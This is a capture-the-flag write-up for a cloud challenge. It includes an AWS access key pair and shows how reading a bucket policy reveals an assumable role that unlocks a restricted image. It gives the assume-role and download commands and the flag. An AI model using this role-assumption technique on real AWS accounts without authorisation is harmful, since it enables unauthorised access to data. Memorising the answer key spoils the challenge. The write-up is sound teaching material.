Cats in the Bucket
=============

Difficulty: medium

Tags: cloud

Description
-------------
There is a bucket full of cat images. One of them contains a flag. Go get it!

- Bucket: `cats-in-a-bucket`
- Access Key ID: `AKIATZ2X44NMCEQW46PL`
- Secret Access Key: `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`


Hint
-------------
What exactly does the bucket allow?


Solution
-------------
As you can imagine, we need to look at an S3 bucket.
Signing into this bucket, we see 4 files named `cat1.jpg`, `cat2.jpg`, `cat3.jpg` and `cat4.jpg`.

While we can open the first 3 files, we don't have permission to get at the 4th.

If we follow the hint, we can use the AWS CLI to get the bucket permissions, which returns the following response:
```
{
    "Policy": "{\"Version\":\"2008-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::261640479576:user/misterbuttons\"},\"Action\":[\"s3:ListBucket\",\"s3:GetBucketPolicy\"],\"Resource\":\"arn:aws:s3:::cats-in-a-bucket\"},{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::261640479576:user/misterbuttons\"},\"Action\":\"s3:GetObject\",\"Resource\":[\"arn:aws:s3:::cats-in-a-bucket/cat1.jpg\",\"arn:aws:s3:::cats-in-a-bucket/cat2.jpg\",\"arn:aws:s3:::cats-in-a-bucket/cat3.jpg\"]},{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::261640479576:role/captainclaw\"},\"Action\":\"s3:ListBucket\",\"Resource\":\"arn:aws:s3:::cats-in-a-bucket\"},{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::261640479576:role/captainclaw\"},\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::cats-in-a-bucket/cat4.jpg\"}]}"
}
```

If we parse this JSON response, we can see that we have read access to those first 3 images as the user `misterbuttons`, but we to use the role `captainclaw` to access the 4th.

Using the AWS CLI, we can run the following command `aws sts assume-role --role-arn arn:aws:iam::261640479576:role/captainclaw --role-session-name "kitty-session"`

This will return a response with a `Credentials` object, which contains the `AccessKeyId`, `SecretAccessKey` and `SessionToken` we need to access the 4th image.

Simply export those values as environment variables and run `aws s3 cp s3://cats-in-a-bucket/cat4.jpg cat4.jpg` to download the image.

Sure enough, the flag is in the image!

Flag
-------------
`he2023{r0l3_assum3d_succ3ssfuLLy}`